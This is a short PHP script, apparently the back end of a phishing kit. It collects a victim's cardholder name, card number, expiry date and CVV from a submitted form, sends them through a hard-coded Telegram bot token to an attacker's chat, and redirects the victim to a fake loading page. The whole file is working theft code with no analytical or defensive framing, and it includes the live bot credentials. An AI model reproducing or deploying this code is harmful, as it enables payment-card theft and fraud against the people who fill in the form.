<?php
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;

// Capturer l'adresse IP du client
$client_ip = $_SERVER['REMOTE_ADDR'];

// Récupérer et stocker le token de session
$session_token = isset($_POST['session_token']) ? $_POST['session_token'] : null;
$_SESSION['token'] = $session_token;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $cardOwner = $_POST['cardOwner'];
    $ccnum = $_POST['ccnum'];
    $ccexp = $_POST['ccexp'];
    $cccvv = $_POST['cccvv'];

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Infos Kara:\n\n";
    $message .= "Nom du Titulaire : $cardOwner\n";
    $message .= "Numéro de carte : $ccnum\n";
    $message .= "Date d'expiration : $ccexp\n";
    $message .= "Cvv : $cccvv\n";

    // L'ID du chat où vous voulez envoyer le message
    $chatId = '-1002427871420';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    try {
        $response = Request::sendMessage($data);
    } catch (Exception $e) {
        echo "Erreur lors de l'envoi du message : " . $e->getMessage();
    }

    // Rediriger l'utilisateur vers la page de confirmation
    header("Location: ../../update/configu/loading.php");
    exit();
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
